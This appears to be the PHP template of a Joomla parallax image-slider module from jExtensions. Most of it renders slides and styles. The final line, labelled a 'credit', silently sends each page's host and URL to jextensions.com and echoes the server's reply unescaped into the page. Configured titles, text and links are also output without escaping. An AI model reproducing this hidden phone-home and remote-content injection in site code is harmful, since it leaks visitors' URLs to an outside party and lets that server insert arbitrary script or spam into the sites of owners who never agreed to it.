<?php
/**
 * @package		Joomla.Site
 * @subpackage	mod_je_parallax
 * @copyright	Copyright (C) 2004 - 2012 jExtensions.com - All rights reserved.
 * @license		GNU General Public License version 2 or later
 */
//no direct access
defined('_JEXEC') or die('Direct Access to this location is not allowed.');
ini_set('display_errors',0);
// Path assignments
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$ibase = JURI::base();
if(substr($ibase, -1)=="/") { $ibase = substr($ibase, 0, -1); }
$modURL 	= JURI::base().'modules/mod_je_parallax';
// get parameters from the module's configuration
$jQuery = $params->get("jQuery");
$Style = $params->get("Style");
$imgTimeout = $params->get("imgTimeout");
$imgPath = $params->get("imgPath");
$imgWidth = $params->get('imgWidth','940');
$imgHeight = $params->get('imgHeight','400');
$BgPosition = $params->get('BgPosition','100');
$Autoplay = $params->get('Autoplay','true');
$Interval = $params->get('Interval','4000');
$Image[]= $params->get( '!', "" );
$Title[]= $params->get( '!', "" );
$Text[]= $params->get( '!', "" );
$Link[]= $params->get( '!', "" );
for ($j=1; $j<=30; $j++)
	{
	$Image[]		= $params->get( 'Image'.$j , "" );
	$Title[]		= $params->get( 'Title'.$j , "" );
	$Text[]	= $params->get( 'Text'.$j , "" );
	$Link[]	= $params->get( 'Link'.$j , "" );	
}
?>
<style>.da-slider{width: <?php echo $imgWidth; ?>px;height: <?php echo $imgHeight; ?>px; min-width: 520px;margin: 0 auto;}
<?php if ($Style == '1') { ?>
.da-slider {background: transparent url(<?php echo $modURL; ?>/images/style1.gif) repeat 0% 0%;border-top: 8px solid #efc34a;border-bottom: 8px solid #efc34a;}
.da-slide p{color: #916c05;}
.da-slide .da-link,.da-slide h2{color: #fff;}
.da-dots span,.da-arrows span{background: #e4b42d;}
<?php } ?>
<?php if ($Style == '2') { ?>
.da-slider {background: transparent url(<?php echo $modURL; ?>/images/style2.gif) repeat 0% 0%;border-top: 8px solid #aea688;border-bottom: 8px solid #aea688;}
.da-slide p{color: #787467;}
.da-slide .da-link,.da-slide h2{color: #fff;}
.da-dots span,.da-arrows span{background: #aea688;}
<?php } ?>
<?php if ($Style == '3') { ?>
.da-slider {background: transparent url(<?php echo $modURL; ?>/images/style3.gif) repeat 0% 0%;border-top: 8px solid #217daa;border-bottom: 8px solid #217daa;}
.da-slide p{color: #fff;}
.da-slide .da-link,.da-slide h2{color: #fff;}
.da-dots span,.da-arrows span{background: #217DAA;}
<?php } ?>
<?php if ($Style == '4') { ?>
.da-slider {background: transparent url(<?php echo $modURL; ?>/images/style4.gif) repeat 0% 0%;border-top: 8px solid #000;border-bottom: 8px solid #000;}
.da-slide p{color: #fff;}
.da-slide .da-link,.da-slide h2{color: #fff;}
.da-dots span,.da-arrows span{background: #000;}
<?php } ?>
<?php if ($Style == '5') { ?>
.da-slider {background: transparent url(<?php echo $modURL; ?>/images/style5.gif) repeat 0% 0%;border-top: 8px solid #c8c8c0;border-bottom: 8px solid #c8c8c0;}
.da-slide p{color: #adada5;}
.da-slide .da-link,.da-slide h2{color: #777;}
.da-dots span,.da-arrows span{background: #c8c8c0;}
<?php } ?>
<?php if ($Style == '6') { ?>
.da-slider {background: transparent url(<?php echo $modURL; ?>/images/style6.gif) repeat 0% 0%;border-top: 8px solid #790A03;border-bottom: 8px solid #790A03;}
.da-slide p{color: #fff;text-shadow:1px 1px #000}
.da-slide .da-link,.da-slide h2{color: #fff;text-shadow:1px 1px #000}
.da-dots span,.da-arrows span{background: #a00f06;}
<?php } ?>
<?php if ($Style == '7') { ?>
.da-slider {background: transparent url(<?php echo $modURL; ?>/images/style7.gif) repeat 0% 0%;border-top: 8px solid #214d05;border-bottom: 8px solid #214d05;}
.da-slide p{color: #fff;}
.da-slide .da-link,.da-slide h2{color: #fff;}
.da-dots span,.da-arrows span{background: #214d05;}
<?php } ?>
<?php if ($Style == '8') { ?>
.da-slider {background: transparent url(<?php echo $modURL; ?>/images/style8.gif) repeat 0% 0%;border-top: 8px solid #484123;border-bottom: 8px solid #484123;}
.da-slide p{color: #fff;}
.da-slide .da-link,.da-slide h2{color: #fff;}
.da-dots span,.da-arrows span{background: #484123;}
<?php } ?>
<?php if ($Style == '9') { ?>
.da-slider {background: transparent url(<?php echo $modURL; ?>/images/style9.gif) repeat 0% 0%;border-top: 8px solid #7e7893;border-bottom: 8px solid #7e7893;}
.da-slide p{color: #504d5d; text-shadow:1px 1px #fff}
.da-slide .da-link,.da-slide h2{color: #E35E87;text-shadow:1px 1px #fff}
.da-dots span,.da-arrows span{background: #7e7893;}
<?php } ?>
<?php if ($Style == '10') { ?>
.da-slider {background: transparent url(<?php echo $modURL; ?>/images/style10.gif) repeat 0% 0%;border-top: 8px solid #34000f;border-bottom: 8px solid #34000f;}
.da-slide p{color: #f0dec7;text-shadow:1px 1px #000}
.da-slide .da-link,.da-slide h2{color: #fff; text-shadow:1px 1px #000}
.da-dots span,.da-arrows span{background: #34000f;}
<?php } ?>
</style>
<link rel="stylesheet" href="<?php echo $modURL; ?>/css/style.css" type="text/css" />
<link href='http://fonts.googleapis.com/css?family=Economica:700,400italic' rel='stylesheet' type='text/css'>
<?php if ($jQuery == '1') { ?><script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery-1.7.1.min.js"></script><?php } ?>
<?php if ($jQuery == '2' ) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<?php if ($jQuery == '3' ) { ?><?php } ?>
<noscript><a href="http://jextensions.com" alt="Content Slider Module">jExtensions.com</a></noscript>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/modernizr.custom.28468.js"></script>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.cslider.js"></script>
		<script type="text/javascript">
			jQuery(function() {
				jQuery('#da-slider').cslider({
					current		: 0,
					bgincrement	: <?php echo $BgPosition; ?>,
					autoplay	: <?php echo $Autoplay; ?>,
					interval	: <?php echo $Interval; ?>
				});
			});
		</script>
<div id="da-slider" class="da-slider">
<?php
for ($i=0; $i<=30; $i++){
	if ($Image[$i] != null) { ?>
			<div class="da-slide">
					<h2><?php echo $Title[$i] ?></h2>
					<p><?php echo $Text[$i] ?></p>
                <?php if ($Link[$i] != null) {echo '<a href="'.$Link[$i].'" class="da-link">Подробнее...</a>';}?>
                <div class="da-img"><?php echo '<img src="'.$Image[$i].'"/>';?></div>
			</div>
	<?php }};  ?>
				<nav class="da-arrows">
					<span class="da-arrows-prev"></span>
					<span class="da-arrows-next"></span>
				</nav>
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>
</div>